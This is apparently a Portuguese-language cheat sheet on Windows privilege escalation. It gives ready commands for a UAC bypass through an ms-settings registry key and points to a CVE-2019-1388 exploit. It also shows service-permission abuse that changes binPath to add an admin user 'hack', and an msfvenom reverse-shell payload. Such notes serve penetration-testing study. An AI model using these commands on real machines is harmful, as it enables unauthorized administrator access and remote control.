# Escalação de Privilégio Windows

## PrivEsc realizando bypass do UAC
O UAC é o User Access Control do Windows que controla as permissões dos usuários. Podemos utilizar serviços que são executados com privilégios mais altos para fazermos a escalação.

Examinar o manifest das aplicações para descobrir o nível de privilégio em que são executadas.  
`sigcheck.exe -a -m C:\Windows\System32\notepad.exe`

Monitorar os processos das aplicações:
`procmon.exe`

A través da monitoração dos processos **HKCU**, podemos identificar chaves do registro do Windows que a aplicação faz a requisição mas a chave não existe, dessa forma criamos a chave com nosso payload que será executado ao iniciar a aplicação.  
Aplicação vulneráveis a esse ataque: **computerdefaults.exe** e **fodhelper.exe**.

Comando para adicionar a entrada no registro:
`reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`

## `PrivEsc utilizando a validação de certificados (CVE-2019-1388)  
Essa falha é explorada ao validar um certificado do Windows, primeiro devemos transferir o exploit.exe para a máquina alvo (https://github.com/jas502n/CVE-2019-1388) e executamos o arquivo.  
Será aberta a caixa de dialogo do UAC, vamos na opção de Ver Detalhes e depois Exibir informções sobre o certificado.
Dessa forma será aberta a caixa de dialogo de validação de certificados, nela é possível clicar no proprietário do certificado e seremos redirecionados para a URL utilizando o Internet Explorer. O ponto aqui é que o Internet Explorer é iniciado com usuário SYSTEM, sendo possível abrir um terminal através da caixa de dialogo da opção Salvar Como do navegador.

## `PrivEsc através de serviços em execução  
Nessa escalação podemos utilizar serviços instalados pelo usuário que estão rodando na máquina e possuem acesso completo ao sistema. Vamos verificar os serviços instalados pelo usuário que estão atualmente rodando:  
```
wmic service get Name,State,PathName | findstr "Running" | findstr "Program"
```

Após identificar o serviço, podemos examinar as permissões com um dos comandos abaixo:
```
# Utilitário do Windows, verifique por serviços com a letra (F)
icacls "$PATH"

# Pacote SysinternalSuite da Microsoft
accesschk.exe -wvcu "Users" *

# Utilitário service do Windows
sc query $SERVICE
sc qc $SERVICE
```

Á partir desse ponto podemos seguir com dois métodos:

### Método I - Manipulando o path do serviço  
Nesse método, o usuário deverá ter permissão para manipular as configurações do serviço. Com o serviço vulnerável identificado, devemos alterar o Path onde o serviço é executo e incluimos nosso payload.
```
sc config $SERVICE binPath="net user hack Admin@123 /add"
```

Nesse momento devemos apenas reinicar o serviço e o payload será executado.
```
# Para o serviço
sc stop $SERVICE

# Iniciar o serviço
sc start $SERVICE
```
## Método II - Manipulando o executavel do serviço
Nesse outro método vamos manipular o executavel do serviço vulnerável. Primeiro devemos gerar nosso exploit de shell reversa e enviar para a máquina alvo.
```
msfvenom -p windows/shell_reverse_tcp lhost=$LHOST lport=LPORT -f exe > exploit.exe
```
Após enviar o exploit para o alvo, faça a alteração do serviço utilizando o `move` e reinicie a máquina alvo com `shutdown /r /t 0`.

## Ferramentas

### Enumeração  
- **WinPEAS**
- **WindowsPrivCheck**

### Pesquisa por vulnerabilidades
**Windows Exploit Suggester (WES-NG)**
Gere um arquivo systeminfo com os dados do alvo:
`systeminfo > systeminfo.txt`  
Coloque o systeminfo na raiz do script e busque por vulnerabilidades com exploits disponíveis:  
`python3 wes.py -e systeminfo.txt`

## Comandos básicos para enumeração    
Busca por arquivos em todos os diretórios  
`where /R c:\ $FILE`  

Busca por strings em todos os diretórios  
`findstr /s "$STRING" *.txt`  

Filtrar saídas concatenando comandos
`findstr /C:"$STRING"`  

Detalhe de todos usuários
`net user`  

Detalhes do usuário  
`net user $USER`  

Nome do host  
`hostname`  

Informações do sistema  
`systeminfo`  

Visualizar processos em execução  
`tasklist`  

Visualizar o serviço associado ao processo  
`tasklist /SVC`  

Visualizar hosts que a máquina se comunica internamente  
`arp -a`  

Tabela de roteamento  
`route print`  

Visualizar portas abertas  
`netstat -ano`  

Ver informações de um serviço específico
`sc query $SERVICE`

Visualizar status do Firewall  
`netsh advfirewall show currentprofile`